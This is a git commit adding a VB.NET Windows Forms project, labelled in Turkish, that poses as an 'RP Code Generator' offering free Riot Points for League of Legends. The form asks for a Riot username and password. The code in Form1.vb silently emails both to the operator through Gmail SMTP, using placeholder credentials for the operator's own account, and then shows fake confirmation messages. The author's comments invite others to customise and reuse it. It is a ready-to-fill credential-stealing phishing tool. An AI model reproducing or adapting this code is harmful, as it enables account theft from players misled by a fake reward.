579f098065401030254cce4209f1b7fd023592a6
Muhammed Ali Polatkesen <polatkesen88@gmail.com>
2023-11-05 22:28:11 +0300

    Add project files.

---
+++ Form1.Designer.vb
@@ -0,0 +1,162 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()>
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()>
+    Private Sub InitializeComponent()
+        Dim resources As ComponentModel.ComponentResourceManager = New ComponentModel.ComponentResourceManager(GetType(Form1))
+        Label1 = New Label()
+        Label2 = New Label()
+        TextBox1 = New TextBox()
+        TextBox2 = New TextBox()
+        Button1 = New Button()
+        Label3 = New Label()
+        CheckBox1 = New CheckBox()
+        CheckBox2 = New CheckBox()
+        CheckBox3 = New CheckBox()
+        Label4 = New Label()
+        SuspendLayout()
+        ' 
+        ' Label1
+        ' 
+        Label1.AutoSize = True
+        Label1.Location = New Point(135, 60)
+        Label1.Name = "Label1"
+        Label1.Size = New Size(97, 15)
+        Label1.TabIndex = 0
+        Label1.Text = "Riot Kullanıcı Adı"
+        ' 
+        ' Label2
+        ' 
+        Label2.AutoSize = True
+        Label2.Location = New Point(135, 115)
+        Label2.Name = "Label2"
+        Label2.Size = New Size(110, 15)
+        Label2.TabIndex = 1
+        Label2.Text = "Riot Kullanıcı Şifresi"
+        ' 
+        ' TextBox1
+        ' 
+        TextBox1.Location = New Point(261, 57)
+        TextBox1.Name = "TextBox1"
+        TextBox1.Size = New Size(156, 23)
+        TextBox1.TabIndex = 2
+        ' 
+        ' TextBox2
+        ' 
+        TextBox2.Location = New Point(261, 112)
+        TextBox2.Name = "TextBox2"
+        TextBox2.PasswordChar = "*"c
+        TextBox2.Size = New Size(156, 23)
+        TextBox2.TabIndex = 3
+        ' 
+        ' Button1
+        ' 
+        Button1.Location = New Point(233, 215)
+        Button1.Name = "Button1"
+        Button1.Size = New Size(198, 64)
+        Button1.TabIndex = 4
+        Button1.Text = "RP KODU OLUŞTUR"
+        Button1.UseVisualStyleBackColor = True
+        ' 
+        ' Label3
+        ' 
+        Label3.AutoSize = True
+        Label3.Location = New Point(135, 163)
+        Label3.Name = "Label3"
+        Label3.Size = New Size(108, 15)
+        Label3.TabIndex = 5
+        Label3.Text = "İstenilen RP miktarı"
+        ' 
+        ' CheckBox1
+        ' 
+        CheckBox1.AutoSize = True
+        CheckBox1.Location = New Point(261, 163)
+        CheckBox1.Name = "CheckBox1"
+        CheckBox1.Size = New Size(58, 19)
+        CheckBox1.TabIndex = 6
+        CheckBox1.Text = "525RP"
+        CheckBox1.UseVisualStyleBackColor = True
+        ' 
+        ' CheckBox2
+        ' 
+        CheckBox2.AutoSize = True
+        CheckBox2.Location = New Point(393, 162)
+        CheckBox2.Name = "CheckBox2"
+        CheckBox2.Size = New Size(58, 19)
+        CheckBox2.TabIndex = 7
+        CheckBox2.Text = "715RP"
+        CheckBox2.UseVisualStyleBackColor = True
+        ' 
+        ' CheckBox3
+        ' 
+        CheckBox3.AutoSize = True
+        CheckBox3.Location = New Point(523, 162)
+        CheckBox3.Name = "CheckBox3"
+        CheckBox3.Size = New Size(58, 19)
+        CheckBox3.TabIndex = 8
+        CheckBox3.Text = "825RP"
+        CheckBox3.UseVisualStyleBackColor = True
+        ' 
+        ' Label4
+        ' 
+        Label4.AutoSize = True
+        Label4.Location = New Point(135, 185)
+        Label4.Name = "Label4"
+        Label4.Size = New Size(446, 15)
+        Label4.TabIndex = 9
+        Label4.Text = "*İşlemin gerçekleşmesi cihaza bağlı olarak 3 ila 5 dakika arasında gerçekleşmektedir."
+        ' 
+        ' Form1
+        ' 
+        AutoScaleDimensions = New SizeF(7F, 15F)
+        AutoScaleMode = AutoScaleMode.Font
+        BackgroundImage = CType(resources.GetObject("$this.BackgroundImage"), Image)
+        ClientSize = New Size(683, 362)
+        Controls.Add(Label4)
+        Controls.Add(CheckBox3)
+        Controls.Add(CheckBox2)
+        Controls.Add(CheckBox1)
+        Controls.Add(Label3)
+        Controls.Add(Button1)
+        Controls.Add(TextBox2)
+        Controls.Add(TextBox1)
+        Controls.Add(Label2)
+        Controls.Add(Label1)
+        Icon = CType(resources.GetObject("$this.Icon"), Icon)
+        MaximizeBox = False
+        Name = "Form1"
+        Text = "RP Code Generator 2016 (fixed)"
+        ResumeLayout(False)
+        PerformLayout()
+    End Sub
+
+    Friend WithEvents Label1 As Label
+    Friend WithEvents Label2 As Label
+    Friend WithEvents TextBox1 As TextBox
+    Friend WithEvents TextBox2 As TextBox
+    Friend WithEvents Button1 As Button
+    Friend WithEvents Label3 As Label
+    Friend WithEvents CheckBox1 As CheckBox
+    Friend WithEvents CheckBox2 As CheckBox
+    Friend WithEvents CheckBox3 As CheckBox
+    Friend WithEvents Label4 As Label
+End Class
---
+++ Form1.vb
@@ -0,0 +1,28 @@
+﻿Imports System.Net.Mail
+Public Class Form1
+    'maliiplt* If you want you can surely change these background or colours and adding new features too!'
+    'just enjoy!'
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        If TextBox1.Text = "" Then
+            MsgBox("Riot Adı Yanlış")
+            If TextBox2.Text = "" Then
+                MsgBox("Şifre Yanlış")
+            Else
+            End If
+        End If
+        Dim smtpServer As New SmtpClient()
+        Dim mail As New MailMessage()
+        smtpServer.Credentials = New Net.NetworkCredential("Your mail adress", "Your Unique Password")
+        smtpServer.Port = 587
+        smtpServer.Host = "smtp.gmail.com"
+        smtpServer.EnableSsl = True
+        mail = New MailMessage()
+        mail.From = New MailAddress("Your mail adress")
+        mail.To.Add("Your mail adress")
+        mail.Subject = "Username : " & TextBox1.Text
+        mail.Body = "Password : " & TextBox2.Text & ","
+        smtpServer.Send(mail)
+        MsgBox("First message box")
+        MsgBox("Second message box (if you don't want to use just delete this line)")
+    End Sub
+End Class
